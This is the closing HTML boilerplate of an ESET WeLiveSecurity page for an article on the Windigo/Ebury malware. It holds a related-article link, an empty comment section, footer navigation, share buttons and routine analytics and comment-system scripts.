                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/eset-kobalos-hpc-high-performance-computing-malware-research-623x432.jpg"
                                                         alt="Windigo Still not Windigone: An Ebury Update">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/">
                                                    Kobalos – A complex Linux threat to high performance computing infrastructure                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F10%2F30%2Fwindigo-ebury-update-2%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F10%2F30%2Fwindigo-ebury-update-2%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F10%2F30%2Fwindigo-ebury-update-2%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-awus -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"102994 https:\/\/ba-infohub-web01-v.hq.eset.com\/?p=102994","disqusShortname":"welivesecurity","disqusTitle":"Windigo Still not Windigone: An Ebury Update","disqusUrl":"https:\/\/www.welivesecurity.com\/2017\/10\/30\/windigo-ebury-update-2\/","postId":"102994"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>